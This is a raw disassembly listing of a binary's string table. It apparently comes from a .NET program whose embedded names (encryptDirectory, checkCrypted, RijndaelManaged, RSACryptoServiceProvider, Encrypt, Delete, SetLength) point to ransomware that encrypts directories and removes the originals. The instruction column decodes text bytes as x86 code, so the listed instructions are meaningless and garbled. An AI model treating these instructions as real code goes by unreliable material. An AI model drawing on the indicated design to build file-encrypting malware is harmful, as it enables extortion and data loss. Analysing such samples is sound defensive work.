  404d79:	00 67 65             	add    %ah,0x65(%edi)
  404d7c:	74 5f                	je     0x404ddd
  404d7e:	4d                   	dec    %ebp
  404d7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d80:	64 75 6c             	fs jne 0x404def
  404d83:	65 73 00             	gs jae 0x404d86
  404d86:	50                   	push   %eax
  404d87:	72 6f                	jb     0x404df8
  404d89:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d8c:	73 4d                	jae    0x404ddb
  404d8e:	6f                   	outsl  %ds:(%esi),(%dx)
  404d8f:	64 75 6c             	fs jne 0x404dfe
  404d92:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  404d96:	74 5f                	je     0x404df7
  404d98:	49                   	dec    %ecx
  404d99:	74 65                	je     0x404e00
  404d9b:	6d                   	insl   (%dx),%es:(%edi)
  404d9c:	00 67 65             	add    %ah,0x65(%edi)
  404d9f:	74 5f                	je     0x404e00
  404da1:	46                   	inc    %esi
  404da2:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404da9:	00 
  404daa:	47                   	inc    %edi
  404dab:	65 74 45             	gs je  0x404df3
  404dae:	78 65                	js     0x404e15
  404db0:	63 75 74             	arpl   %esi,0x74(%ebp)
  404db3:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  404dba:	6d                   	insl   (%dx),%es:(%edi)
  404dbb:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404dbf:	67 65 74 5f          	addr16 gs je 0x404e22
  404dc3:	49                   	dec    %ecx
  404dc4:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  404dc8:	63 65 70             	arpl   %esp,0x70(%ebp)
  404dcb:	74 69                	je     0x404e36
  404dcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404dce:	6e                   	outsb  %ds:(%esi),(%dx)
  404dcf:	00 53 79             	add    %dl,0x79(%ebx)
  404dd2:	73 74                	jae    0x404e48
  404dd4:	65 6d                	gs insl (%dx),%es:(%edi)
  404dd6:	2e 54                	cs push %esp
  404dd8:	65 78 74             	gs js  0x404e4f
  404ddb:	00 53 74             	add    %dl,0x74(%ebx)
  404dde:	72 69                	jb     0x404e49
  404de0:	6e                   	outsb  %ds:(%esi),(%dx)
  404de1:	67 42                	addr16 inc %edx
  404de3:	75 69                	jne    0x404e4e
  404de5:	6c                   	insb   (%dx),%es:(%edi)
  404de6:	64 65 72 00          	fs gs jb 0x404dea
  404dea:	4e                   	dec    %esi
  404deb:	65 78 74             	gs js  0x404e62
  404dee:	00 67 65             	add    %ah,0x65(%edi)
  404df1:	74 5f                	je     0x404e52
  404df3:	43                   	inc    %ebx
  404df4:	68 61 72 73 00       	push   $0x737261
  404df9:	41                   	inc    %ecx
  404dfa:	70 70                	jo     0x404e6c
  404dfc:	65 6e                	outsb  %gs:(%esi),(%dx)
  404dfe:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  404e02:	63 6f 64             	arpl   %ebp,0x64(%edi)
  404e05:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  404e0c:	5f                   	pop    %edi
  404e0d:	55                   	push   %ebp
  404e0e:	54                   	push   %esp
  404e0f:	46                   	inc    %esi
  404e10:	38 00                	cmp    %al,(%eax)
  404e12:	47                   	inc    %edi
  404e13:	65 74 42             	gs je  0x404e58
  404e16:	79 74                	jns    0x404e8c
  404e18:	65 73 00             	gs jae 0x404e1b
  404e1b:	43                   	inc    %ebx
  404e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  404e1d:	6e                   	outsb  %ds:(%esi),(%dx)
  404e1e:	76 65                	jbe    0x404e85
  404e20:	72 74                	jb     0x404e96
  404e22:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  404e26:	61                   	popa
  404e27:	73 65                	jae    0x404e8e
  404e29:	36 34 53             	ss xor $0x53,%al
  404e2c:	74 72                	je     0x404ea0
  404e2e:	69 6e 67 00 3c 3e 63 	imul   $0x633e3c00,0x67(%esi),%ebp
  404e35:	5f                   	pop    %edi
  404e36:	5f                   	pop    %edi
  404e37:	44                   	inc    %esp
  404e38:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404e3f:	6c                   	insb   (%dx),%es:(%edi)
  404e40:	61                   	popa
  404e41:	73 73                	jae    0x404eb6
  404e43:	35 00 3c 3e 63       	xor    $0x633e3c00,%eax
  404e48:	5f                   	pop    %edi
  404e49:	5f                   	pop    %edi
  404e4a:	44                   	inc    %esp
  404e4b:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404e52:	6c                   	insb   (%dx),%es:(%edi)
  404e53:	61                   	popa
  404e54:	73 73                	jae    0x404ec9
  404e56:	37                   	aaa
  404e57:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404e5a:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404e5d:	44                   	inc    %esp
  404e5e:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404e65:	6c                   	insb   (%dx),%es:(%edi)
  404e66:	61                   	popa
  404e67:	73 73                	jae    0x404edc
  404e69:	39 00                	cmp    %eax,(%eax)
  404e6b:	43                   	inc    %ebx
  404e6c:	53                   	push   %ebx
  404e6d:	24 3c                	and    $0x3c,%al
  404e6f:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  404e73:	6c                   	insb   (%dx),%es:(%edi)
  404e74:	6f                   	outsl  %ds:(%esi),(%dx)
  404e75:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404e78:	73 36                	jae    0x404eb0
  404e7a:	00 66 69             	add    %ah,0x69(%esi)
  404e7d:	6c                   	insb   (%dx),%es:(%edi)
  404e7e:	65 73 00             	gs jae 0x404e81
  404e81:	63 68 65             	arpl   %ebp,0x65(%eax)
  404e84:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  404e87:	72 79                	jb     0x404f02
  404e89:	70 74                	jo     0x404eff
  404e8b:	65 64 00 63 68       	gs add %ah,%fs:0x68(%ebx)
  404e90:	69 6c 64 44 69 72 65 	imul   $0x63657269,0x44(%esp,%eiz,2),%ebp
  404e97:	63 
  404e98:	74 6f                	je     0x404f09
  404e9a:	72 69                	jb     0x404f05
  404e9c:	65 73 00             	gs jae 0x404e9f
  404e9f:	3c 65                	cmp    $0x65,%al
  404ea1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ea2:	63 72 79             	arpl   %esi,0x79(%edx)
  404ea5:	70 74                	jo     0x404f1b
  404ea7:	44                   	inc    %esp
  404ea8:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404eaf:	79 3e                	jns    0x404eef
  404eb1:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404eb4:	32 00                	xor    (%eax),%al
  404eb6:	3c 65                	cmp    $0x65,%al
  404eb8:	6e                   	outsb  %ds:(%esi),(%dx)
  404eb9:	63 72 79             	arpl   %esi,0x79(%edx)
  404ebc:	70 74                	jo     0x404f32
  404ebe:	44                   	inc    %esp
  404ebf:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404ec6:	79 3e                	jns    0x404f06
  404ec8:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404ecb:	34 00                	xor    $0x0,%al
  404ecd:	43                   	inc    %ebx
  404ece:	53                   	push   %ebx
  404ecf:	24 3c                	and    $0x3c,%al
  404ed1:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  404ed5:	6c                   	insb   (%dx),%es:(%edi)
  404ed6:	6f                   	outsl  %ds:(%esi),(%dx)
  404ed7:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404eda:	73 38                	jae    0x404f14
  404edc:	00 65 78             	add    %ah,0x78(%ebp)
  404edf:	74 65                	je     0x404f46
  404ee1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee2:	73 69                	jae    0x404f4d
  404ee4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ee5:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee6:	00 3c 65 6e 63 72 79 	add    %bh,0x7972636e(,%eiz,2)
  404eed:	70 74                	jo     0x404f63
  404eef:	44                   	inc    %esp
  404ef0:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404ef7:	79 3e                	jns    0x404f37
  404ef9:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404efc:	33 00                	xor    (%eax),%eax
  404efe:	69 00 45 00 54 6f    	imul   $0x6f540045,(%eax),%eax
  404f04:	4c                   	dec    %esp
  404f05:	6f                   	outsl  %ds:(%esi),(%dx)
  404f06:	77 65                	ja     0x404f6d
  404f08:	72 00                	jb     0x404f0a
  404f0a:	47                   	inc    %edi
  404f0b:	65 74 45             	gs je  0x404f53
  404f0e:	78 74                	js     0x404f84
  404f10:	65 6e                	outsb  %gs:(%esi),(%dx)
  404f12:	73 69                	jae    0x404f7d
  404f14:	6f                   	outsl  %ds:(%esi),(%dx)
  404f15:	6e                   	outsb  %ds:(%esi),(%dx)
  404f16:	00 47 65             	add    %al,0x65(%edi)
  404f19:	74 46                	je     0x404f61
  404f1b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404f22:	00 
  404f23:	50                   	push   %eax
  404f24:	72 65                	jb     0x404f8b
  404f26:	64 69 63 61 74 65 60 	imul   $0x31606574,%fs:0x61(%ebx),%esp
  404f2d:	31 
  404f2e:	00 41 72             	add    %al,0x72(%ecx)
  404f31:	72 61                	jb     0x404f94
  404f33:	79 00                	jns    0x404f35
  404f35:	45                   	inc    %ebp
  404f36:	78 69                	js     0x404fa1
  404f38:	73 74                	jae    0x404fae
  404f3a:	73 00                	jae    0x404f3c
  404f3c:	46                   	inc    %esi
  404f3d:	69 6c 65 49 6e 66 6f 	imul   $0x6f666e,0x49(%ebp,%eiz,2),%ebp
  404f44:	00 
  404f45:	46                   	inc    %esi
  404f46:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  404f4d:	65 
  404f4e:	6d                   	insl   (%dx),%es:(%edi)
  404f4f:	49                   	dec    %ecx
  404f50:	6e                   	outsb  %ds:(%esi),(%dx)
  404f51:	66 6f                	outsw  %ds:(%esi),(%dx)
  404f53:	00 46 69             	add    %al,0x69(%esi)
  404f56:	6c                   	insb   (%dx),%es:(%edi)
  404f57:	65 41                	gs inc %ecx
  404f59:	74 74                	je     0x404fcf
  404f5b:	72 69                	jb     0x404fc6
  404f5d:	62 75 74             	bound  %esi,0x74(%ebp)
  404f60:	65 73 00             	gs jae 0x404f63
  404f63:	73 65                	jae    0x404fca
  404f65:	74 5f                	je     0x404fc6
  404f67:	41                   	inc    %ecx
  404f68:	74 74                	je     0x404fde
  404f6a:	72 69                	jb     0x404fd5
  404f6c:	62 75 74             	bound  %esi,0x74(%ebp)
  404f6f:	65 73 00             	gs jae 0x404f72
  404f72:	46                   	inc    %esi
  404f73:	69 6c 65 00 49 45 6e 	imul   $0x756e4549,0x0(%ebp,%eiz,2),%ebp
  404f7a:	75 
  404f7b:	6d                   	insl   (%dx),%es:(%edi)
  404f7c:	65 72 61             	gs jb  0x404fe0
  404f7f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  404f83:	31 00                	xor    %eax,(%eax)
  404f85:	57                   	push   %edi
  404f86:	72 69                	jb     0x404ff1
  404f88:	74 65                	je     0x404fef
  404f8a:	41                   	inc    %ecx
  404f8b:	6c                   	insb   (%dx),%es:(%edi)
  404f8c:	6c                   	insb   (%dx),%es:(%edi)
  404f8d:	4c                   	dec    %esp
  404f8e:	69 6e 65 73 00 44 69 	imul   $0x69440073,0x65(%esi),%ebp
  404f95:	72 65                	jb     0x404ffc
  404f97:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  404f9b:	79 49                	jns    0x404fe6
  404f9d:	6e                   	outsb  %ds:(%esi),(%dx)
  404f9e:	66 6f                	outsw  %ds:(%esi),(%dx)
  404fa0:	00 67 65             	add    %ah,0x65(%edi)
  404fa3:	74 5f                	je     0x405004
  404fa5:	41                   	inc    %ecx
  404fa6:	74 74                	je     0x40501c
  404fa8:	72 69                	jb     0x405013
  404faa:	62 75 74             	bound  %esi,0x74(%ebp)
  404fad:	65 73 00             	gs jae 0x404fb0
  404fb0:	44                   	inc    %esp
  404fb1:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404fb8:	79 00                	jns    0x404fba
  404fba:	47                   	inc    %edi
  404fbb:	65 74 46             	gs je  0x405004
  404fbe:	69 6c 65 73 00 41 63 	imul   $0x74634100,0x73(%ebp,%eiz,2),%ebp
  404fc5:	74 
  404fc6:	69 6f 6e 60 31 00 53 	imul   $0x53003160,0x6e(%edi),%ebp
  404fcd:	79 73                	jns    0x405042
  404fcf:	74 65                	je     0x405036
  404fd1:	6d                   	insl   (%dx),%es:(%edi)
  404fd2:	2e 54                	cs push %esp
  404fd4:	68 72 65 61 64       	push   $0x64616572
  404fd9:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  404fe0:	6b 73 00 50          	imul   $0x50,0x0(%ebx),%esi
  404fe4:	61                   	popa
  404fe5:	72 61                	jb     0x405048
  404fe7:	6c                   	insb   (%dx),%es:(%edi)
  404fe8:	6c                   	insb   (%dx),%es:(%edi)
  404fe9:	65 6c                	gs insb (%dx),%es:(%edi)
  404feb:	00 50 61             	add    %dl,0x61(%eax)
  404fee:	72 61                	jb     0x405051
  404ff0:	6c                   	insb   (%dx),%es:(%edi)
  404ff1:	6c                   	insb   (%dx),%es:(%edi)
  404ff2:	65 6c                	gs insb (%dx),%es:(%edi)
  404ff4:	4c                   	dec    %esp
  404ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff7:	70 52                	jo     0x40504b
  404ff9:	65 73 75             	gs jae 0x405071
  404ffc:	6c                   	insb   (%dx),%es:(%edi)
  404ffd:	74 00                	je     0x404fff
  404fff:	46                   	inc    %esi
  405000:	6f                   	outsl  %ds:(%esi),(%dx)
  405001:	72 00                	jb     0x405003
  405003:	47                   	inc    %edi
  405004:	65 74 44             	gs je  0x40504b
  405007:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40500e:	69 65 73 00 43 6f 6e 	imul   $0x6e6f4300,0x73(%ebp),%esp
  405015:	74 61                	je     0x405078
  405017:	69 6e 73 00 41 70 70 	imul   $0x70704100,0x73(%esi),%ebp
  40501e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405020:	64 4c                	fs dec %esp
  405022:	69 6e 65 00 42 79 74 	imul   $0x74794200,0x65(%esi),%ebp
  405029:	65 00 3c 50          	add    %bh,%gs:(%eax,%edx,2)
  40502d:	72 69                	jb     0x405098
  40502f:	76 61                	jbe    0x405092
  405031:	74 65                	je     0x405098
  405033:	49                   	dec    %ecx
  405034:	6d                   	insl   (%dx),%es:(%edi)
  405035:	70 6c                	jo     0x4050a3
  405037:	65 6d                	gs insl (%dx),%es:(%edi)
  405039:	65 6e                	outsb  %gs:(%esi),(%dx)
  40503b:	74 61                	je     0x40509e
  40503d:	74 69                	je     0x4050a8
  40503f:	6f                   	outsl  %ds:(%esi),(%dx)
  405040:	6e                   	outsb  %ds:(%esi),(%dx)
  405041:	44                   	inc    %esp
  405042:	65 74 61             	gs je  0x4050a6
  405045:	69 6c 73 3e 7b 43 42 	imul   $0x3342437b,0x3e(%ebx,%esi,2),%ebp
  40504c:	33 
  40504d:	32 34 32             	xor    (%edx,%esi,1),%dh
  405050:	42                   	inc    %edx
  405051:	30 2d 32 31 35 37    	xor    %ch,0x37353132
  405057:	2d 34 32 42 44       	sub    $0x44423234,%eax
  40505c:	2d 41 32 31 42       	sub    $0x42313241,%eax
  405061:	2d 38 36 32 46       	sub    $0x46323638,%eax
  405066:	45                   	inc    %ebp
  405067:	44                   	inc    %esp
  405068:	31 44 46 46          	xor    %eax,0x46(%esi,%eax,2)
  40506c:	31 30                	xor    %esi,(%eax)
  40506e:	7d 00                	jge    0x405070
  405070:	24 24                	and    $0x24,%al
  405072:	6d                   	insl   (%dx),%es:(%edi)
  405073:	65 74 68             	gs je  0x4050de
  405076:	6f                   	outsl  %ds:(%esi),(%dx)
  405077:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  40507b:	30 30                	xor    %dh,(%eax)
  40507d:	30 30                	xor    %dh,(%eax)
  40507f:	30 66 2d             	xor    %ah,0x2d(%esi)
  405082:	31 00                	xor    %eax,(%eax)
  405084:	52                   	push   %edx
  405085:	75 6e                	jne    0x4050f5
  405087:	74 69                	je     0x4050f2
  405089:	6d                   	insl   (%dx),%es:(%edi)
  40508a:	65 48                	gs dec %eax
  40508c:	65 6c                	gs insb (%dx),%es:(%edi)
  40508e:	70 65                	jo     0x4050f5
  405090:	72 73                	jb     0x405105
  405092:	00 52 75             	add    %dl,0x75(%edx)
  405095:	6e                   	outsb  %ds:(%esi),(%dx)
  405096:	74 69                	je     0x405101
  405098:	6d                   	insl   (%dx),%es:(%edi)
  405099:	65 46                	gs inc %esi
  40509b:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4050a2:	64 6c                	fs insb (%dx),%es:(%edi)
  4050a4:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  4050a8:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4050af:	65 
  4050b0:	41                   	inc    %ecx
  4050b1:	72 72                	jb     0x405125
  4050b3:	61                   	popa
  4050b4:	79 00                	jns    0x4050b6
  4050b6:	46                   	inc    %esi
  4050b7:	69 6c 65 53 74 72 65 	imul   $0x61657274,0x53(%ebp,%eiz,2),%ebp
  4050be:	61 
  4050bf:	6d                   	insl   (%dx),%es:(%edi)
  4050c0:	00 46 69             	add    %al,0x69(%esi)
  4050c3:	6c                   	insb   (%dx),%es:(%edi)
  4050c4:	65 4d                	gs dec %ebp
  4050c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4050c7:	64 65 00 53 79       	fs add %dl,%gs:0x79(%ebx)
  4050cc:	73 74                	jae    0x405142
  4050ce:	65 6d                	gs insl (%dx),%es:(%edi)
  4050d0:	2e 53                	cs push %ebx
  4050d2:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4050d6:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4050dd:	70 
  4050de:	74 6f                	je     0x40514f
  4050e0:	67 72 61             	addr16 jb 0x405144
  4050e3:	70 68                	jo     0x40514d
  4050e5:	79 00                	jns    0x4050e7
  4050e7:	52                   	push   %edx
  4050e8:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  4050ef:	4d                   	dec    %ebp
  4050f0:	61                   	popa
  4050f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4050f2:	61                   	popa
  4050f3:	67 65 64 00 53 79    	gs add %dl,%fs:0x79(%bp,%di)
  4050f9:	6d                   	insl   (%dx),%es:(%edi)
  4050fa:	6d                   	insl   (%dx),%es:(%edi)
  4050fb:	65 74 72             	gs je  0x405170
  4050fe:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  405105:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  40510c:	74 
  40510d:	5f                   	pop    %edi
  40510e:	4b                   	dec    %ebx
  40510f:	65 79 53             	gs jns 0x405165
  405112:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  405119:	5f                   	pop    %edi
  40511a:	42                   	inc    %edx
  40511b:	6c                   	insb   (%dx),%es:(%edi)
  40511c:	6f                   	outsl  %ds:(%esi),(%dx)
  40511d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  405120:	69 7a 65 00 50 61 64 	imul   $0x64615000,0x65(%edx),%edi
  405127:	64 69 6e 67 4d 6f 64 	imul   $0x65646f4d,%fs:0x67(%esi),%ebp
  40512e:	65 
  40512f:	00 73 65             	add    %dh,0x65(%ebx)
  405132:	74 5f                	je     0x405193
  405134:	50                   	push   %eax
  405135:	61                   	popa
  405136:	64 64 69 6e 67 00 52 	fs imul $0x63665200,%fs:0x67(%esi),%ebp
  40513d:	66 63 
  40513f:	32 38                	xor    (%eax),%bh
  405141:	39 38                	cmp    %edi,(%eax)
  405143:	44                   	inc    %esp
  405144:	65 72 69             	gs jb  0x4051b0
  405147:	76 65                	jbe    0x4051ae
  405149:	42                   	inc    %edx
  40514a:	79 74                	jns    0x4051c0
  40514c:	65 73 00             	gs jae 0x40514f
  40514f:	67 65 74 5f          	addr16 gs je 0x4051b2
  405153:	4b                   	dec    %ebx
  405154:	65 79 53             	gs jns 0x4051aa
  405157:	69 7a 65 00 44 65 72 	imul   $0x72654400,0x65(%edx),%edi
  40515e:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  405165:	73 00                	jae    0x405167
  405167:	73 65                	jae    0x4051ce
  405169:	74 5f                	je     0x4051ca
  40516b:	4b                   	dec    %ebx
  40516c:	65 79 00             	gs jns 0x40516f
  40516f:	67 65 74 5f          	addr16 gs je 0x4051d2
  405173:	42                   	inc    %edx
  405174:	6c                   	insb   (%dx),%es:(%edi)
  405175:	6f                   	outsl  %ds:(%esi),(%dx)
  405176:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  405179:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  405180:	5f                   	pop    %edi
  405181:	49                   	dec    %ecx
  405182:	56                   	push   %esi
  405183:	00 43 69             	add    %al,0x69(%ebx)
  405186:	70 68                	jo     0x4051f0
  405188:	65 72 4d             	gs jb  0x4051d8
  40518b:	6f                   	outsl  %ds:(%esi),(%dx)
  40518c:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  405191:	74 5f                	je     0x4051f2
  405193:	4d                   	dec    %ebp
  405194:	6f                   	outsl  %ds:(%esi),(%dx)
  405195:	64 65 00 53 74       	fs add %dl,%gs:0x74(%ebx)
  40519a:	72 65                	jb     0x405201
  40519c:	61                   	popa
  40519d:	6d                   	insl   (%dx),%es:(%edi)
  40519e:	00 57 72             	add    %dl,0x72(%edi)
  4051a1:	69 74 65 00 49 43 72 	imul   $0x79724349,0x0(%ebp,%eiz,2),%esi
  4051a8:	79 
  4051a9:	70 74                	jo     0x40521f
  4051ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4051ac:	54                   	push   %esp
  4051ad:	72 61                	jb     0x405210
  4051af:	6e                   	outsb  %ds:(%esi),(%dx)
  4051b0:	73 66                	jae    0x405218
  4051b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4051b3:	72 6d                	jb     0x405222
  4051b5:	00 43 72             	add    %al,0x72(%ebx)
  4051b8:	65 61                	gs popa
  4051ba:	74 65                	je     0x405221
  4051bc:	45                   	inc    %ebp
  4051bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4051be:	63 72 79             	arpl   %esi,0x79(%edx)
  4051c1:	70 74                	jo     0x405237
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	72 00                	jb     0x4051c6
  4051c6:	43                   	inc    %ebx
  4051c7:	72 79                	jb     0x405242
  4051c9:	70 74                	jo     0x40523f
  4051cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4051cc:	53                   	push   %ebx
  4051cd:	74 72                	je     0x405241
  4051cf:	65 61                	gs popa
  4051d1:	6d                   	insl   (%dx),%es:(%edi)
  4051d2:	00 43 72             	add    %al,0x72(%ebx)
  4051d5:	79 70                	jns    0x405247
  4051d7:	74 6f                	je     0x405248
  4051d9:	53                   	push   %ebx
  4051da:	74 72                	je     0x40524e
  4051dc:	65 61                	gs popa
  4051de:	6d                   	insl   (%dx),%es:(%edi)
  4051df:	4d                   	dec    %ebp
  4051e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4051e1:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4051e6:	70 79                	jo     0x405261
  4051e8:	54                   	push   %esp
  4051e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4051ea:	00 46 6c             	add    %al,0x6c(%esi)
  4051ed:	75 73                	jne    0x405262
  4051ef:	68 00 46 69 6c       	push   $0x6c694600
  4051f4:	65 41                	gs inc %ecx
  4051f6:	63 63 65             	arpl   %esp,0x65(%ebx)
  4051f9:	73 73                	jae    0x40526e
  4051fb:	00 53 74             	add    %dl,0x74(%ebx)
  4051fe:	72 65                	jb     0x405265
  405200:	61                   	popa
  405201:	6d                   	insl   (%dx),%es:(%edi)
  405202:	57                   	push   %edi
  405203:	72 69                	jb     0x40526e
  405205:	74 65                	je     0x40526c
  405207:	72 00                	jb     0x405209
  405209:	54                   	push   %esp
  40520a:	65 78 74             	gs js  0x405281
  40520d:	57                   	push   %edi
  40520e:	72 69                	jb     0x405279
  405210:	74 65                	je     0x405277
  405212:	72 00                	jb     0x405214
  405214:	57                   	push   %edi
  405215:	72 69                	jb     0x405280
  405217:	74 65                	je     0x40527e
  405219:	41                   	inc    %ecx
  40521a:	6c                   	insb   (%dx),%es:(%edi)
  40521b:	6c                   	insb   (%dx),%es:(%edi)
  40521c:	54                   	push   %esp
  40521d:	65 78 74             	gs js  0x405294
  405220:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  405224:	65 74 65             	gs je  0x40528c
  405227:	00 46 69             	add    %al,0x69(%esi)
  40522a:	6c                   	insb   (%dx),%es:(%edi)
  40522b:	65 53                	gs push %ebx
  40522d:	68 61 72 65 00       	push   $0x657261
  405232:	53                   	push   %ebx
  405233:	65 74 4c             	gs je  0x405282
  405236:	65 6e                	outsb  %gs:(%esi),(%dx)
  405238:	67 74 68             	addr16 je 0x4052a3
  40523b:	00 52 4e             	add    %dl,0x4e(%edx)
  40523e:	47                   	inc    %edi
  40523f:	43                   	inc    %ebx
  405240:	72 79                	jb     0x4052bb
  405242:	70 74                	jo     0x4052b8
  405244:	6f                   	outsl  %ds:(%esi),(%dx)
  405245:	53                   	push   %ebx
  405246:	65 72 76             	gs jb  0x4052bf
  405249:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  405250:	69 64 65 72 00 52 61 	imul   $0x6e615200,0x72(%ebp,%eiz,2),%esp
  405257:	6e 
  405258:	64 6f                	outsl  %fs:(%esi),(%dx)
  40525a:	6d                   	insl   (%dx),%es:(%edi)
  40525b:	4e                   	dec    %esi
  40525c:	75 6d                	jne    0x4052cb
  40525e:	62 65 72             	bound  %esp,0x72(%ebp)
  405261:	47                   	inc    %edi
  405262:	65 6e                	outsb  %gs:(%esi),(%dx)
  405264:	65 72 61             	gs jb  0x4052c8
  405267:	74 6f                	je     0x4052d8
  405269:	72 00                	jb     0x40526b
  40526b:	52                   	push   %edx
  40526c:	53                   	push   %ebx
  40526d:	41                   	inc    %ecx
  40526e:	43                   	inc    %ebx
  40526f:	72 79                	jb     0x4052ea
  405271:	70 74                	jo     0x4052e7
  405273:	6f                   	outsl  %ds:(%esi),(%dx)
  405274:	53                   	push   %ebx
  405275:	65 72 76             	gs jb  0x4052ee
  405278:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40527f:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  405286:	79 
  405287:	6d                   	insl   (%dx),%es:(%edi)
  405288:	6d                   	insl   (%dx),%es:(%edi)
  405289:	65 74 72             	gs je  0x4052fe
  40528c:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  405293:	69 74 68 6d 00 46 72 	imul   $0x6f724600,0x6d(%eax,%ebp,2),%esi
  40529a:	6f 
  40529b:	6d                   	insl   (%dx),%es:(%edi)
  40529c:	58                   	pop    %eax
  40529d:	6d                   	insl   (%dx),%es:(%edi)
  40529e:	6c                   	insb   (%dx),%es:(%edi)
  40529f:	53                   	push   %ebx
  4052a0:	74 72                	je     0x405314
  4052a2:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  4052a9:	72 79                	jb     0x405324
  4052ab:	70 74                	jo     0x405321
  4052ad:	00 73 65             	add    %dh,0x65(%ebx)
  4052b0:	74 5f                	je     0x405311
  4052b2:	50                   	push   %eax
  4052b3:	65 72 73             	gs jb  0x405329
  4052b6:	69 73 74 4b 65 79 49 	imul   $0x4979654b,0x74(%ebx),%esi
  4052bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4052be:	43                   	inc    %ebx
  4052bf:	73 70                	jae    0x405331
  4052c1:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4052c4:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4052c7:	44                   	inc    %esp
  4052c8:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4052cf:	6c                   	insb   (%dx),%es:(%edi)
  4052d0:	61                   	popa
  4052d1:	73 73                	jae    0x405346
  4052d3:	63 00                	arpl   %eax,(%eax)
  4052d5:	64 69 72 4e 61 6d 65 	imul   $0x656d61,%fs:0x4e(%edx),%esi
  4052dc:	00 
  4052dd:	3c 6c                	cmp    $0x6c,%al
  4052df:	6f                   	outsl  %ds:(%esi),(%dx)
  4052e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4052e1:	6b 46 6f 72          	imul   $0x72,0x6f(%esi),%eax
  4052e5:	44                   	inc    %esp
